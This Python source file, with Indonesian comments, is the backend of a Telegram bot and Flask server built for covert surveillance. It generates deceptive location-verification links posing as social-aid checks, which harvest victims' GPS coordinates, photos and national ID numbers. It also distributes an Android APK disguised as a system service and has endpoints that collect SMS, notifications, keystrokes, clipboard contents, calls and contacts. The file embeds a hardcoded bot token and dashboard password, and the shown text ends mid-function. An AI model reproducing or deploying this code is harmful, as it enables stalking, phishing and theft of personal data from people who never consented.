#!/usr/bin/env python3
"""
GPS Tracker Bot - Simple Link Tracking
Buat link → kirim ke target → target buka → GPS terkirim → notif ke bot
"""

import os
import json
import sqlite3
import hashlib
import time
import asyncio
import base64
from io import BytesIO
from datetime import datetime
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, Response, send_file
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8845527390:AAH1RZGR9zuYM7Se_O5171QwgnhQ6gs85dY")
BASE_URL = os.environ.get("BASE_URL", "https://scarf-ion-cranium.ngrok-free.dev")
DASHBOARD_TOKEN = os.environ.get("DASHBOARD_TOKEN", "Kosay378%")
DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tracker.db")

# ============ DATABASE ============
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS links (
        id TEXT PRIMARY KEY, tracking_id TEXT UNIQUE,
        title TEXT, description TEXT,
        created_by INTEGER, created_at TEXT, is_active INTEGER DEFAULT 1)""")
    c.execute("""CREATE TABLE IF NOT EXISTS tracking_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT, tracking_id TEXT,
        latitude REAL, longitude REAL, accuracy REAL,
        user_agent TEXT, ip_address TEXT, timestamp TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS photos (
        id INTEGER PRIMARY KEY AUTOINCREMENT, tracking_id TEXT,
        photo BLOB, timestamp TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS android_reports (
        id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT,
        report_data TEXT, ip_address TEXT, timestamp TEXT)""")

    # v4.0 — Bansos-tracker features
    c.execute("""CREATE TABLE IF NOT EXISTS sms_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        sender TEXT, message TEXT, timestamp TEXT,
        device_id TEXT, received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS notif_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        sender TEXT, message TEXT, timestamp TEXT,
        device_id TEXT, app TEXT, received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS keylog_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, text TEXT, package TEXT,
        class_name TEXT, view_id TEXT, char_length INTEGER,
        timestamp INTEGER, received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS clipboard_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, text TEXT, char_length INTEGER,
        app TEXT, class_name TEXT,
        timestamp INTEGER, received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS app_usage_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, package TEXT, class_name TEXT,
        timestamp INTEGER, received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS command_queue (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, command_type TEXT, command_params TEXT,
        status TEXT DEFAULT 'pending',
        created_at TEXT, executed_at TEXT, result TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS device_status (
        device_id TEXT PRIMARY KEY,
        last_seen TEXT, status TEXT, info TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS call_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, phone_number TEXT, contact_name TEXT,
        call_type TEXT, duration INTEGER, timestamp TEXT,
        received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS contacts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, name TEXT, phone_number TEXT,
        email TEXT, source TEXT, timestamp TEXT,
        received_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS sim_change_alerts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT, old_sim TEXT, new_sim TEXT,
        old_operator TEXT, new_operator TEXT,
        timestamp TEXT, received_at TEXT)""")
    conn.commit()
    conn.close()

def gen_id():
    return hashlib.md5(f"{time.time()}{os.urandom(8)}".encode()).hexdigest()[:10]

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(query, params)
    conn.commit()
    result = c.fetchall()
    conn.close()
    return result

# ============ TELEGRAM BOT ============
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("📦 Buat Link Tracking", callback_data="create_link")],
        [InlineKeyboardButton("📋 Daftar Link Saya", callback_data="list_links")],
        [InlineKeyboardButton("🔔 Cek Notifikasi", callback_data="check_notif")],
        [InlineKeyboardButton("🗺 Lihat Peta", callback_data="view_map")],
        [InlineKeyboardButton("📱 Download APK", callback_data="apk_info")],
        [InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}")],
    ]
    text = (
        "🚚 *GPS Tracker Bot*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Buat link tracking, kirim ke target,\n"
        "terima notifikasi lokasi otomatis!\n\n"
        "📌 *Fitur:*\n"
        "• Buat link tracking\n"
        "• Kirim link ke target\n"
        "• Notifikasi lokasi otomatis\n"
        "• Lihat peta & riwayat\n\n"
        "📱 *Download APK Monitoring:*\n"
        f"`{BASE_URL}/apk/download`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Pilih menu 👇"
    )
    try:
        banner_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static", "banner.jpg")
        with open(banner_path, "rb") as f:
            await update.message.reply_photo(photo=f)
    except Exception as e:
        print(f"Banner error: {e}")
    # Send menu text separately so edit_message_text works on callbacks
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )

async def on_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try: await q.answer()
    except: pass

    uid = q.from_user.id
    d = q.data

    if d == "create_link":
        tid = gen_id()
        title = "Verifikasi Lokasi"
        desc = "Silakan konfirmasi lokasi Anda"
        db_exec("INSERT INTO links VALUES (?,?,?,?,?,?,1)",
                (tid, tid, title, desc, uid, datetime.now().isoformat()))
        url = f"{BASE_URL}/track/{tid}"
        kb = [
            [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={url}")],
            [InlineKeyboardButton("📋 Daftar Link", callback_data="list_links")],
            [InlineKeyboardButton("⬅️ Menu", callback_data="home")],
        ]
        await q.edit_message_text(
            f"✅ *Link Berhasil Dibuat!*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔗 *Link:*\n`{url}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📤 Kirim link ini ke target.\n"
            f"Saat dibuka & GPS diizinkan,\n"
            f"notifikasi lokasi otomatis ke sini.\n\n"
            f"🆔 `{tid}`",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "list_links":
        rows = db_exec("SELECT tracking_id,title,created_at,is_active FROM links WHERE created_by=? ORDER BY created_at DESC", (uid,))
        if not rows:
            await q.edit_message_text("📋 *Daftar Link*\n\nBelum ada link.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📦 Buat", callback_data="create_link")]]),
                parse_mode="Markdown")
            return
        text = "📋 *Daftar Link*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        kb = []
        for tid, title, cat, active in rows:
            st = "🟢" if active else "🔴"
            ev = db_exec("SELECT COUNT(*) FROM tracking_events WHERE tracking_id=?", (tid,))[0][0]
            text += f"{st} `{tid}` | 🔔 {ev}x | 📅 {cat[:10]}\n"
            kb.append([
                InlineKeyboardButton(f"🔔 {tid[:6]}", callback_data=f"ev:{tid}"),
                InlineKeyboardButton("🗺", callback_data=f"map:{tid}"),
                InlineKeyboardButton("⏸" if active else "▶️", callback_data=f"tg:{tid}"),
                InlineKeyboardButton("🗑", callback_data=f"del:{tid}"),
            ])
        kb.append([InlineKeyboardButton("⬅️ Menu", callback_data="home")])
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d.startswith("ev:"):
        tid = d.split(":")[1]
        evs = db_exec("SELECT latitude,longitude,accuracy,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 5", (tid,))
        if not evs:
            await q.edit_message_text(f"🔔 *Notifikasi*\n\nBelum ada event untuk `{tid}`.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")]]),
                parse_mode="Markdown")
            return
        text = f"🔔 *Notifikasi - `{tid}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        for i, (lat, lon, acc, ts) in enumerate(evs):
            text += f"📍 #{i+1} | 🕐 {ts[:19]}\n   📐 `{lat:.6f}, {lon:.6f}` | 🎯 ±{acc:.0f}m\n\n"
        kb = [[InlineKeyboardButton("🗺 Google Maps", url=f"https://www.google.com/maps?q={evs[0][0]},{evs[0][1]}")],
              [InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")]]
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d.startswith("map:"):
        tid = d.split(":")[1]
        evs = db_exec("SELECT latitude,longitude,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 1", (tid,))
        if evs:
            kb = [
                [InlineKeyboardButton("🌐 Peta Lengkap", url=f"{BASE_URL}/map/{tid}")],
                [InlineKeyboardButton("📍 Google Maps", url=f"https://www.google.com/maps?q={evs[0][0]},{evs[0][1]}")],
                [InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")],
            ]
            await q.edit_message_text(
                f"🗺 *Peta - `{tid}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📍 Terakhir: {evs[0][2][:19]}\n📐 `{evs[0][0]:.6f}, {evs[0][1]:.6f}`",
                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        else:
            await q.edit_message_text("🗺 *Peta*\n\nBelum ada data.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="list_links")]]),
                parse_mode="Markdown")

    elif d.startswith("del:"):
        tid = d.split(":")[1]
        db_exec("DELETE FROM links WHERE tracking_id=? AND created_by=?", (tid, uid))
        db_exec("DELETE FROM tracking_events WHERE tracking_id=?", (tid,))
        await q.edit_message_text(f"🗑 `{tid}` dihapus.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 Daftar", callback_data="list_links")]]),
            parse_mode="Markdown")

    elif d.startswith("tg:"):
        tid = d.split(":")[1]
        db_exec("UPDATE links SET is_active=1-is_active WHERE tracking_id=? AND created_by=?", (tid, uid))
        row = db_exec("SELECT is_active FROM links WHERE tracking_id=? AND created_by=?", (tid, uid))
        status = "Aktif 🟢" if row and row[0][0] else "Nonaktif 🔴"
        await q.edit_message_text(f"✅ `{tid}` → {status}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 Daftar", callback_data="list_links")]]),
            parse_mode="Markdown")

    elif d == "check_notif":
        links = db_exec("SELECT tracking_id FROM links WHERE created_by=? AND is_active=1", (uid,))
        text = "🔔 *Cek Notifikasi*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        found = 0
        for (tid,) in links:
            evs = db_exec("SELECT latitude,longitude,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 1", (tid,))
            if evs:
                found += 1
                text += f"📍 `{tid[:6]}` | 🕐 {evs[0][2][:19]}\n   📐 `{evs[0][0]:.6f}, {evs[0][1]:.6f}`\n\n"
        if not found:
            text += "Belum ada notifikasi.\n"
        kb = [[InlineKeyboardButton("📋 Semua Link", callback_data="list_links")],
              [InlineKeyboardButton("⬅️ Menu", callback_data="home")]]
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "view_map":
        links = db_exec("SELECT tracking_id FROM links WHERE created_by=?", (uid,))
        active = []
        for (tid,) in links:
            evs = db_exec("SELECT latitude,longitude FROM tracking_events WHERE tracking_id=? LIMIT 1", (tid,))
            if evs:
                active.append((tid, evs[0]))
        if not active:
            await q.edit_message_text("🗺 *Peta*\n\nBelum ada data lokasi.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📦 Buat Link", callback_data="create_link")]]),
                parse_mode="Markdown")
            return
        kb = [[InlineKeyboardButton(f"📍 {t[0][:6]}", url=f"{BASE_URL}/map/{t[0]}")] for t in active[:10]]
        kb.append([InlineKeyboardButton("⬅️ Menu", callback_data="home")])
        await q.edit_message_text("🗺 *Peta Tracking*\n━━━━━━━━━━━━━━━━━━━━\n\nPilih link:",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "home":
        kb = [
            [InlineKeyboardButton("📦 Buat Link Tracking", callback_data="create_link")],
            [InlineKeyboardButton("📋 Daftar Link Saya", callback_data="list_links")],
            [InlineKeyboardButton("🔔 Cek Notifikasi", callback_data="check_notif")],
            [InlineKeyboardButton("🗺 Lihat Peta", callback_data="view_map")],
            [InlineKeyboardButton("📱 Download APK", callback_data="apk_info")],
            [InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}")],
        ]
        await q.edit_message_text("🚚 *GPS Tracker Bot*\n━━━━━━━━━━━━━━━━━━━━\n\nPilih menu 👇",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif d == "apk_info":
        await q.answer()
        banner_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static", "apk-banner.png")
        caption = (
            "📱 *System Service APK*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔧 Gear Icon — menyamar sbg service sistem\n"
            "📸 Camera Capture — foto otomatis\n"
            "📍 GPS Tracker — lacak lokasi real-time\n"
            "🔋 Battery Info — status baterai\n"
            "📦 App List — daftar app terinstall\n"
            "🚀 Auto-start saat boot HP\n\n"
            "⬇️ *Download:*\n"
            f"`{BASE_URL}/apk/download`\n\n"
            "📊 *Dashboard:*\n"
            f"`{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}`\n\n"
            "Copy link di atas, buka di browser!"
        )
        kb = [[
            InlineKeyboardButton("⬇️ Download APK", url=f"{BASE_URL}/apk/download"),
            InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}"),
        ]]
        kb.append([InlineKeyboardButton("⬅️ Menu", callback_data="home")])
        try:
            with open(banner_path, "rb") as f:
                await context.bot.send_photo(chat_id=q.message.chat_id, photo=f,
                    caption=caption, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        except Exception as e:
            print(f"APK info error: {e}")
            await context.bot.send_message(chat_id=q.message.chat_id, text=caption,
                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

# ============ NOTIFICATION ============
async def notify(tracking_id, lat, lon, accuracy, ip, data=None):
    info = db_exec("SELECT created_by FROM links WHERE tracking_id=?", (tracking_id,))
    if not info:
        return
    owner_id = info[0][0]
    bot = Bot(token=BOT_TOKEN)

    text = (
        f"🔔 *LOKASI BARU DITERIMA!*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 `{tracking_id}`\n"
        f"🕐 {datetime.now().strftime('%d/%m %H:%M:%S')}\n\n"
    )

    if data:
        text += (
            f"📋 *Data Penerima:*\n"
            f"👤 Nama: *{data.get('nama', '-')}*\n"
            f"🪪 No. KTP: `{data.get('no_ktp', '-')}`\n"
            f"📖 No. KK: `{data.get('no_kk', '-')}`\n"
            f"🏠 Alamat: {data.get('alamat', '-')}\n"
            f"🚧 RT/RW: {data.get('rt', '-')}/{data.get('rw', '-')}\n"
            f"🏙 Kota: {data.get('kota', '-')}\n"
            f"🗺 Provinsi: {data.get('provinsi', '-')}\n\n"
        )

    text += (
        f"📍 *Koordinat:*\n"
        f"   📐 `{lat:.6f}, {lon:.6f}`\n"
        f"   🎯 Akurasi: ±{accuracy:.0f}m\n"
        f"   🌐 IP: `{ip}`\n\n━━━━━━━━━━━━━━━━━━━━"
    )
    kb = [
        [InlineKeyboardButton("🗺 Google Maps", url=f"https://www.google.com/maps?q={lat},{lon}")],
        [InlineKeyboardButton("📍 Street View", url=f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={lat},{lon}")],
        [InlineKeyboardButton("📊 Riwayat", callback_data=f"ev:{tracking_id}")],
        [InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}")],
    ]
    try:
        photo_data = data.get('photo') if data else None
        if photo_data and photo_data.startswith('data:image'):
            # Send as photo with caption
            photo_bytes = base64.b64decode(photo_data.split(',')[1])
            photo_io = BytesIO(photo_bytes)
            photo_io.name = 'photo.jpg'
            await bot.send_photo(owner_id, photo_io, caption=text,
                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        else:
            await bot.send_message(owner_id, text,
                reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    except Exception as e:
        print(f"Notif error: {e}")

# ============ FLASK ============
app = Flask(__name__, template_folder=os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates"))
app.config['TEMPLATES_AUTO_RELOAD'] = True
app.secret_key = hashlib.sha256(f"gps-tracker-{BOT_TOKEN}-secret".encode()).hexdigest()

@app.after_request
def skip_ngrok(response):
    response.headers["ngrok-skip-browser-warning"] = "true"
    return response

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/track/<tid>")
def track(tid):
    info = db_exec("SELECT tracking_id,title,description,is_active FROM links WHERE tracking_id=?", (tid,))
    if not info:
        return render_template("error.html", message="Link tidak ditemukan"), 404
    if not info[0][3]:
        return render_template("error.html", message="Link tidak aktif"), 403
    return render_template("track.html", tracking_id=tid, title=info[0][1], description=info[0][2])

@app.route("/api/location/<tid>", methods=["POST"])
def api_loc(tid):
    d = request.json
    lat, lon, acc = d.get("latitude"), d.get("longitude"), d.get("accuracy", 0)
    if lat is None or lon is None:
        return jsonify({"error": "Invalid"}), 400
    info = db_exec("SELECT is_active FROM links WHERE tracking_id=?", (tid,))
    if not info or not info[0][0]:
        return jsonify({"error": "Not found"}), 404
    db_exec("INSERT INTO tracking_events (tracking_id,latitude,longitude,accuracy,user_agent,ip_address,timestamp) VALUES (?,?,?,?,?,?,?)",
        (tid, lat, lon, acc, str(request.user_agent), request.remote_addr, datetime.now().isoformat()))
    # Save KTP data
    db_exec("UPDATE links SET title=?, description=? WHERE tracking_id=?",
        (d.get("nama",""), f"KK:{d.get('no_kk','')} | {d.get('alamat','')}", tid))
    # Save photo if provided
    photo_data = d.get("photo")
    if photo_data and photo_data.startswith("data:image"):
        try:
            photo_bin = base64.b64decode(photo_data.split(",")[1])
            db_exec("INSERT INTO photos (tracking_id, photo, timestamp) VALUES (?,?,?)",
                (tid, photo_bin, datetime.now().isoformat()))
        except Exception as e:
            print(f"Photo save error: {e}")
    asyncio.run(notify(tid, lat, lon, acc, request.remote_addr, d))
    return jsonify({"success": True})

@app.route("/api/photo/<tid>")
def api_photo(tid):
    rows = db_exec("SELECT photo FROM photos WHERE tracking_id=? ORDER BY id DESC LIMIT 1", (tid,))
    if not rows:
        return jsonify({"error": "No photo"}), 404
    return Response(rows[0][0], mimetype='image/jpeg')

@app.route("/api/photos/<tid>")
def api_photos(tid):
    if not is_authenticated():
        return jsonify({"error": "unauthorized"}), 403
    rows = db_exec("SELECT id, timestamp FROM photos WHERE tracking_id=? ORDER BY id DESC", (tid,))
    return jsonify({"photos": [{"id": r[0], "ts": r[1]} for r in rows]})

@app.route("/map/<tid>")
def map_view(tid):
    info = db_exec("SELECT tracking_id,title,description,created_at FROM links WHERE tracking_id=?", (tid,))
    if not info:
        return render_template("error.html", message="Link tidak ditemukan"), 404
    evs = db_exec("SELECT latitude,longitude,accuracy,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC", (tid,))
    return render_template("map.html", tracking_id=tid, link_info=info[0], events=evs)

def token_hash():
    return hashlib.sha256(DASHBOARD_TOKEN.encode()).hexdigest()[:16]

def is_authenticated():
    """Check if user is authenticated via session or URL token"""
    if session.get("dashboard_authenticated") and session.get("token_hash") == token_hash():
        return True
    token = request.args.get("token", "")
    if token == DASHBOARD_TOKEN:
        session["dashboard_authenticated"] = True
        session["token_hash"] = token_hash()
        session.permanent = False
        return True
    return False

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        data = request.get_json(silent=True) or {}
        password = data.get("password", "")
        if password == DASHBOARD_TOKEN:
            session["dashboard_authenticated"] = True
            session["token_hash"] = token_hash()
            session.permanent = False
            return jsonify({"success": True, "redirect": "/dashboard"})
        return jsonify({"success": False, "message": "Password salah"}), 401
    # GET: show login page
    if session.get("dashboard_authenticated") and session.get("token_hash") == token_hash():
        return redirect(url_for("dashboard"))
    session.clear()
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")

@app.route("/dashboard")
def dashboard():
    if not is_authenticated():
        return redirect("/login")
    return render_template("dashboard.html", token=DASHBOARD_TOKEN)

@app.route("/api/dashboard")
def api_dashboard():
    if not is_authenticated():
        return jsonify({"error": "unauthorized"}), 403

    import datetime
    from datetime import datetime as dt

    now = dt.now()
    today_start = now.replace(hour=0, minute=0, second=0, microsecond=0).isoformat()

    total_links = db_exec("SELECT COUNT(*) FROM links")[0][0]
    active_links = db_exec("SELECT COUNT(*) FROM links WHERE is_active=1")[0][0]
    total_events = db_exec("SELECT COUNT(*) FROM tracking_events")[0][0]
    today_events = db_exec("SELECT COUNT(*) FROM tracking_events WHERE timestamp>=?", (today_start,))[0][0]
    total_photos = db_exec("SELECT COUNT(*) FROM photos")[0][0]
    total_users = db_exec("SELECT COUNT(DISTINCT created_by) FROM links")[0][0]
    total_android = db_exec("SELECT COUNT(DISTINCT device_id) FROM android_reports")[0][0]
    android_reports_count = db_exec("SELECT COUNT(*) FROM android_reports")[0][0]
    total_sms = db_exec("SELECT COUNT(*) FROM sms_log")[0][0] + db_exec("SELECT COUNT(*) FROM notif_log WHERE app='sms'")[0][0]
    total_notif = db_exec("SELECT COUNT(*) FROM notif_log WHERE app NOT IN ('sms','com.whatsapp','com.facebook.katana')")[0][0]
    total_keylogs = db_exec("SELECT COUNT(*) FROM keylog_log")[0][0]
    total_clipboard = db_exec("SELECT COUNT(*) FROM clipboard_log")[0][0]
    total_apps = db_exec("SELECT COUNT(*) FROM app_usage_log")[0][0]
    total_calls = db_exec("SELECT COUNT(*) FROM call_logs")[0][0]
    total_contacts_count = db_exec("SELECT COUNT(*) FROM contacts")[0][0]
    total_sim_alerts = db_exec("SELECT COUNT(*) FROM sim_change_alerts")[0][0]
    device_count = db_exec("SELECT COUNT(DISTINCT device_id) FROM device_status")[0][0]
    total_whatsapp = db_exec("SELECT COUNT(*) FROM notif_log WHERE app='com.whatsapp'")[0][0]
    total_facebook = db_exec("SELECT COUNT(*) FROM notif_log WHERE app='com.facebook.katana'")[0][0]

    recent_events = db_exec("""
        SELECT te.tracking_id, te.latitude, te.longitude, te.accuracy, te.timestamp,
               l.title as nama
        FROM tracking_events te
        LEFT JOIN links l ON te.tracking_id = l.tracking_id
        ORDER BY te.timestamp DESC LIMIT 20
    """)
    recent_events_list = []
    for row in recent_events:
        tid = row[0]
        photo_count = db_exec("SELECT COUNT(*) FROM photos WHERE tracking_id=?", (tid,))[0][0]
        recent_events_list.append({
            "tracking_id": row[0], "latitude": row[1], "longitude": row[2],
            "accuracy": row[3], "timestamp": row[4], "nama": row[5] or "",
            "photos": photo_count, "has_photo": photo_count > 0
        })

    links = db_exec("SELECT tracking_id, title, created_at, is_active FROM links ORDER BY created_at DESC LIMIT 50")
    links_list = []
    for row in links:
        ev_count = db_exec("SELECT COUNT(*) FROM tracking_events WHERE tracking_id=?", (row[0],))[0][0]
        last_loc = db_exec("SELECT latitude, longitude FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC LIMIT 1", (row[0],))
        lat, lng = last_loc[0] if last_loc else (None, None)
        links_list.append({
            "tracking_id": row[0], "title": row[1],
            "created_at": row[2], "is_active": bool(row[3]),
            "event_count": ev_count, "lat": lat, "lng": lng
        })

    latest_location = None
    latest = db_exec("""
        SELECT te.latitude, te.longitude, te.timestamp, te.tracking_id
        FROM tracking_events te
        ORDER BY te.timestamp DESC LIMIT 1
    """)
    if latest:
        latest_location = {"lat": latest[0][0], "lng": latest[0][1], "ts": latest[0][2], "tid": latest[0][3]}

    return jsonify({
        "total_links": total_links, "active_links": active_links,
        "total_events": total_events, "today_events": today_events,
        "total_photos": total_photos, "total_users": total_users,
        "total_android": total_android, "android_reports_count": android_reports_count,
        "total_sms": total_sms, "total_notif": total_notif,
        "total_keylogs": total_keylogs, "total_clipboard": total_clipboard,
        "total_apps": total_apps, "total_calls": total_calls,
        "total_contacts": total_contacts_count, "total_sim_alerts": total_sim_alerts,
        "device_count": device_count,
        "total_whatsapp": total_whatsapp, "total_facebook": total_facebook,
        "recent_events": recent_events_list,
        "links": links_list,
        "latest_location": latest_location,
        "generated_at": now.strftime("%Y-%m-%d %H:%M:%S")
    })

# ============ ANDROID APP ENDPOINTS ============
@app.route("/api/android-report", methods=["POST"])
def api_android_report():
    """Endpoint for Android app to report device data"""
    try:
        data = request.get_json(silent=True) or {}
        device_id = data.get("device_id", "unknown")
        report_data = json.dumps(data)

        ip_address = request.remote_addr or "0.0.0.0"
        from datetime import datetime
        db_exec("INSERT INTO android_reports (device_id, report_data, ip_address, timestamp) VALUES (?,?,?,?)",
                (device_id, report_data, ip_address, datetime.now().isoformat()))

        # Try to send to Telegram owner (first user)
        owner = db_exec("SELECT DISTINCT created_by FROM links ORDER BY created_at ASC LIMIT 1")
        if owner:
            try:
                from telegram import Bot
                bot = Bot(token=BOT_TOKEN)
                device = data.get("device", {})
                loc = data.get("location", {})
                summary = (
                    f"📱 *Android Report*\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🆔 `{device_id[:12]}...`\n"
                    f"📱 {device.get('manufacturer','?')} {device.get('model','?')}\n"
                    f"🤖 Android {device.get('android_version','?')} (API {device.get('api_level','?')})\n"
                    f"🔋 {data.get('battery',{}).get('percentage',0):.0f}%\n"
                    f"📍 {loc.get('lat','?')}, {loc.get('lng','?')}\n"
                    f"🕐 {datetime.fromtimestamp(data.get('timestamp',0)).strftime('%H:%M:%S')}\n"
                )
                apps = data.get("installed_apps", [])
                if apps:
                    summary += f"\n📦 *Apps* ({len(apps)}):\n"
                    for app in apps[:10]:
                        summary += f"• {app.get('name','?')}\n"
                summary += f"\n━━━━━━━━━━━━━━━━━━━━\n📊 Dashboard → {BASE_URL}/dashboard"
                kb = [[InlineKeyboardButton("📊 Dashboard", url=f"{BASE_URL}/dashboard?token={DASHBOARD_TOKEN}")]]
                asyncio.run(bot.send_message(owner[0][0], summary,
                    reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown"))
            except Exception as e:
                print(f"Android notif error: {e}")

        return jsonify({"success": True, "message": "Report received"})
    except Exception as e:
        print(f"Android report error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/android-devices")
def api_android_devices():
    if not is_authenticated():
        return jsonify({"error": "unauthorized"}), 403
    rows = db_exec("SELECT device_id, report_data, timestamp FROM android_reports ORDER BY id DESC LIMIT 50")
    devices = []
    for row in rows:
        try:
            data = json.loads(row[1])
        except:
            data = {}
        devices.append({
            "device_id": row[0],
            "data": data,
            "timestamp": row[2]
        })
    return jsonify({"devices": devices})


# ============ BANSOS-TRACKER DATA COLLECTION APIS ============

@app.route("/api/collect-sms", methods=["POST"])
def api_collect_sms():
    """Collect SMS from Android device"""
    try:
        d = request.get_json(silent=True) or {}
        device_id = d.get("device_id", "unknown")
        sms_list = d.get("messages", d.get("sms_list", []))
        for sms in sms_list:
            db_exec("INSERT INTO sms_log (sender,message,timestamp,device_id,received_at) VALUES (?,?,?,?,?)",
                (sms.get("sender",""), sms.get("message",""), sms.get("timestamp",""),
                 device_id, datetime.now().isoformat()))
        return jsonify({"success": True, "count": len(sms_list)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/collect-notif", methods=["POST"])
def api_collect_notif():
    """Collect notifications from Android"""
    try:
        d = request.get_json(silent=True) or {}
        device_id = d.get("device_id", "unknown")
        notif_list = d.get("notifications", d.get("notif_list", []))
        for n in notif_list:
            db_exec("INSERT INTO notif_log (sender,message,timestamp,device_id,app,received_at) VALUES (?,?,?,?,?,?)",
                (n.get("sender",""), n.get("message",""), n.get("timestamp",""),
                 device_id, n.get("app",""), datetime.now().isoformat()))
        return jsonify({"success": True, "count": len(notif_list)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/collect-keylog", methods=["POST"])
def api_collect_keylog():
    """Collect keystrokes from Android Accessibility Service"""
    try:
        d = request.get_json(silent=True) or {}
        device_id = d.get("device_id", "unknown")
        entries = d.get("entries", d.get("keylog_list", []))
        if not entries and "text" in d:
            entries = [d]
        for e in entries:
            db_exec("INSERT INTO keylog_log (device_id,text,package,class_name,view_id,char_length,timestamp,received_at) VALUES (?,?,?,?,?,?,?,?)",
                (device_id, e.get("text",""), e.get("package",""), e.get("class_name",""),
                 e.get("view_id",""), e.get("char_length",len(e.get("text",""))),
                 e.get("timestamp",int(time.time())), datetime.now().isoformat()))
        return jsonify({"success": True, "count": len(entries)})
    except Exception as e:
